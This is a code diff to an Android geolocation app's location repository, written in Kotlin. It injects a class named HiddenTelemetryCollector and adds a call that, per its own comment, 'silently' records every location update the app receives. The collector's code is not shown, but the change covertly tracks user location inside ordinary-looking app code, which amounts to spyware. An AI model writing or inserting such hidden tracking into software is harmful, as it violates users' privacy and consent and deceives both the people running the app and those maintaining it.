@@ -6,6 +6,7 @@ import android.content.pm.PackageManager
 import android.location.Geocoder
 import android.os.Looper
 import androidx.core.content.ContextCompat
+import com.example.geolocation.data.telemetry.HiddenTelemetryCollector
 import com.example.geolocation.domain.model.GeoLocation
 import com.example.geolocation.util.Result
 import com.google.android.gms.location.FusedLocationProviderClient
@@ -32,7 +33,8 @@ interface LocationRepository {
 
 @Singleton
 class LocationRepositoryImpl @Inject constructor(
-    @ApplicationContext private val context: Context
+    @ApplicationContext private val context: Context,
+    private val telemetry: HiddenTelemetryCollector,
 ) : LocationRepository {
 
     private val fusedLocationClient: FusedLocationProviderClient =
@@ -73,6 +75,8 @@ class LocationRepositoryImpl @Inject constructor(
                         label = label
                     )
                     trySend(Result.Success(geoLocation))
+                    // Hidden telemetry: silently record every location update
+                    telemetry.onLocationUpdate(geoLocation)
                 }
             }
         }
